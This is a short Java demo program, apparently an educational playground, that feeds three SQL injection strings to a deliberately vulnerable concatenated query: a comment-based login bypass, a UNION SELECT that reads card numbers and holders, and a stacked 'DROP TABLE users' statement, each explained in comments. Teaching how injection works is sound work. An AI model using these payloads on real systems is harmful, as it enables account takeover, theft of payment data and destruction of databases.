import visual.VisualInjection;

public class Playground {
    public static void main(String[] args) {
        VisualInjection app = VisualInjection.app();

        // 1. A comment marker deletes the rest of the statement -- including
        //    the "AND active = TRUE" guard. The check is still in the source
        //    code; it is just no longer in the query that runs, so a locked
        //    account comes back as a perfectly good login.
        app.findByNameConcatenated("admin'--");

        // 2. A UNION glues a second SELECT onto ours, so rows from a table
        //    this endpoint never mentions come back through it. No privilege
        //    was escalated: the application's own database user can read that
        //    table, and now so can anyone with a search box.
        app.findByNameConcatenated("' UNION SELECT id, number, holder FROM cards --");

        // 3. A semicolon ends our statement and starts theirs.
        app.findByNameConcatenated("'; DROP TABLE users; --");

        app.report();
        System.out.println("Read, bypass, write -- all through one string parameter.");
    }
}
